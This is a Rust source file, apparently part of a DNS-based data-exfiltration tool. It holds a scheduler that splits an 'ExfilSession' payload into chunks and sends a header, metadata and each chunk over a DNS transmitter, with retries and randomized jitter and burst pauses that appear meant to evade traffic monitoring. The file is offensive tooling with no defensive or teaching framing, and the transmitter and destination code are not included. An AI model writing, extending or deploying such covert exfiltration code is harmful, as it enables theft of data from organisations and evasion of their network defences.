use crate::config::Config;
use crate::dns::{build_metadata_payload, DnsTransmitter};
use crate::metadata::ExfilSession;
use anyhow::Result;
use rand::Rng;
use std::thread;
use std::time::Duration;

pub struct ChunkScheduler {
    cfg: Config,
}

impl ChunkScheduler {
    pub fn new(cfg: Config) -> Self {
        Self { cfg }
    }

    pub fn run(&self, session: &mut ExfilSession, transmitter: &mut DnsTransmitter) -> Result<()> {
        let metadata_payload = build_metadata_payload(session);
        let metadata_segments = split_metadata_segments(&metadata_payload, session.job.chunk_size);
        session.set_metadata_frames(metadata_segments.len());

        transmitter.send_header(session)?;
        transmitter.send_metadata_segments(session, &metadata_segments)?;

        let mut chunks_in_burst = 0usize;
        while session.next_chunk < session.job.total_chunks {
            let index = session.next_chunk;
            let (start, end) = session.chunk_range(index);
            let chunk = &session.job.data[start..end];

            self.send_chunk_with_retry(transmitter, session, index, chunk)?;
            session.next_chunk += 1;
            chunks_in_burst += 1;

            if session.next_chunk >= session.job.total_chunks {
                break;
            }

            if chunks_in_burst >= self.cfg.chunks_per_burst {
                chunks_in_burst = 0;
                self.sleep_with_jitter(self.cfg.burst_pause_ms);
            } else {
                self.sleep_with_jitter(0);
            }
        }

        transmitter.send_completion(session)?;
        Ok(())
    }

    fn sleep_with_jitter(&self, base_ms: u64) {
        let mut rng = rand::thread_rng();
        let jitter = if self.cfg.jitter_max_ms > self.cfg.jitter_min_ms {
            rng.gen_range(self.cfg.jitter_min_ms..=self.cfg.jitter_max_ms)
        } else {
            self.cfg.jitter_min_ms
        };
        let total = base_ms + jitter;
        if total > 0 {
            thread::sleep(Duration::from_millis(total));
        }
    }

    fn send_chunk_with_retry(
        &self,
        transmitter: &mut DnsTransmitter,
        session: &ExfilSession,
        index: usize,
        chunk: &[u8],
    ) -> Result<()> {
        let mut attempts_remaining = self.cfg.chunk_retry_attempts.max(1);
        loop {
            match transmitter.send_chunk(session, index, chunk) {
                Ok(_) => return Ok(()),
                Err(err) => {
                    attempts_remaining -= 1;
                    if attempts_remaining == 0 {
                        return Err(err);
                    }
                    self.delay_before_retry();
                }
            }
        }
    }

    fn delay_before_retry(&self) {
        if self.cfg.chunk_retry_delay_ms > 0 {
            thread::sleep(Duration::from_millis(self.cfg.chunk_retry_delay_ms));
        } else {
            self.sleep_with_jitter(0);
        }
    }
}

fn split_metadata_segments(payload: &[u8], chunk_size: usize) -> Vec<Vec<u8>> {
    let segment_size = chunk_size.max(1);
    if payload.is_empty() {
        return vec![Vec::new()];
    }

    payload
        .chunks(segment_size)
        .map(|chunk| chunk.to_vec())
        .collect()
}
